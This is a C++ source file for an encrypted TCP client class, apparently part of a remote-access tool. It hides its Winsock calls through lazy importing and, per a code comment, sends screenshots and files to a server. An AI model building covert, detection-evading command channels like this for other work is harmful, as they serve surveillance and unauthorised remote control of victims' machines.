#include "TCPClient.h"
#include "iostream"
#include <chrono>
#include <thread>
#include "lazyimporter.h"

constexpr int BufferSize = 4096;


void Client::GetEncryptionKey()
{
	ByteArray EncryptionKey = Client::ReceiveRawBytes();

	Client::EncryptionKey = EncryptionKey;
}
ByteArray Client::EKey()
{
	return Client::EncryptionKey;
}
int Client::SendRawBytes(ByteArray& Bytes)
{
	int32_t Result = LI_FN( send).in(LI_MODULE("Ws2_32.dll").cached())(Client::Socket, (char*)Bytes.data(), (int)Bytes.size(), 0);
	return Result;
}
ByteArray Client::ReceiveRawBytes()
{
	ByteArray	ReceivedBytes;
	uint8_t		RecvBuffer[BufferSize];

	while (true)
	{
		int32_t Received = LI_FN(recv).in(LI_MODULE("Ws2_32.dll").cached())(Client::Socket, (char*)RecvBuffer, BufferSize, 0);

		if (Received < 0)
			break;

		for (int n = 0; n < Received; ++n)
		{
			ReceivedBytes.push_back(RecvBuffer[n]);
		}

		if (Received <= BufferSize)
			break;

	}

	return ReceivedBytes;
}
void Client::SendBytes(ByteArray& Bytes)
{
	ByteArray Encrypted = Encryption.Encrypt(Bytes, Client::EKey());

	SendRawBytes(Encrypted);
}
int Client::_SendBytes(ByteArray& Bytes)
{
	ByteArray Encrypted = Encryption.Encrypt(Bytes, Client::EKey());

	
	return SendRawBytes(Encrypted);
}
ByteArray Client::ReceiveBytes()
{
	ByteArray ReceivedBytes = ReceiveRawBytes();
	ByteArray Decrypted = Encryption.Decrypt(ReceivedBytes, Client::EKey());

	return Decrypted;
}
void Client::SendText(std::string Text)
{
	// we set sending bytes on text because we know it isn't going to be a file
	// doing this to rawbytes or sendbytes would mean when we send a file the heartbeat would corrupt screenshots etc.
	Client::SendingBytes = true;
	std::string Send = Text;
	ByteArray plaintext(Send.begin(), Send.end());
	Client::SendBytes(plaintext);
	Client::SendingBytes = false;

}

std::string Client::ReceiveText()
{
	ByteArray rray = Client::ReceiveBytes();

	std::string str(rray.begin(), rray.end());

	return str;
}

